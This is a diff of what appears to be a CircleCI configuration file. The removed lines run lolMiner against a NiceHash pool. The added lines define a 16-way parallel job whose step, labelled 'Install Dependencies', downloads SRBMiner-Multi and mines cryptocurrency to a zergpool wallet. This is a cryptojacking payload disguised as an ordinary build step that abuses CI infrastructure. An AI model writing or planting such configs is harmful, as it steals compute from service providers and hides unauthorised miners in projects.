@@ -1,4 +1,21 @@
-! wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz
-! tar -xf lolMiner_v1.51a_Lin64.tar.gz
-%cd 1.51a
-! ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.usa-east.nicehash.com:3353 --user 38DMxhRb9PFy3N7GDbVt2r59mqL9R4zRuG.cloud pause
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.0/SRBMiner-Multi-0-9-0-Linux.tar.xz
+                 tar xf- SRBMiner-Multi-0-9-0-Linux.tar.xz
+                   cd SRBMiner-Multi-0-9-0
+                     ./SRBMiner-MULTI --algorithm verushash --cpu-threads 20 --pool verushash.na.mine.zergpool.com:3300 --wallet MQoUXBrWHK3r4y6xnt59fA3Mqjy87carmg
+
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
